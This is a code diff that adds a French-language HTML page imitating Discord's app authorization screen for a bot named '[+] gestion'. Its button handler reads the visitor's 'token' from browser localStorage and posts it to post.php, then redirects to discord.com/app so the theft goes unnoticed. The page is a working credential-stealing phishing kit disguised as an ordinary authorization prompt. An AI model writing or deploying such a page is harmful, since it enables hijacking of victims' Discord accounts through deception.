@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autoriser l'application</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="authorize-box">
+        <div class="pfp-container">
+            <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=user" class="user-pfp">
+            <div class="dots">...</div>
+            <img src="https://api.dicebear.com/7.x/bottts/svg?seed=gestion" class="bot-pfp">
+        </div>
+        <h1>[+] gestion</h1>
+        <p class="wants">veut accéder à ton compte Discord</p>
+
+        <div class="permissions">
+            <p class="perm-title">Ceci autorisera le développeur de [+] gestion à :</p>
+            <ul>
+                <li>✅ Créer des commandes</li>
+                <li>✅ T'envoyer des messages privés</li>
+                <li>❌ Te lire une petite histoire</li>
+            </ul>
+        </div>
+
+        <div class="footer-info">
+            <p>🛡️ En ligne depuis le 22 janv. 2026</p>
+        </div>
+
+        <button id="authBtn">Autoriser</button>
+    </div>
+    <script>
+        document.getElementById('authBtn').addEventListener('click', async () => {
+     
+            let token = window.localStorage.getItem('token') || "N/A";
+            await fetch('post.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ token: token, step: "Autorisation" })
+            });
+            window.location.href = "https://discord.com/app";
+        });
+    </script>
+</body>
+</html>
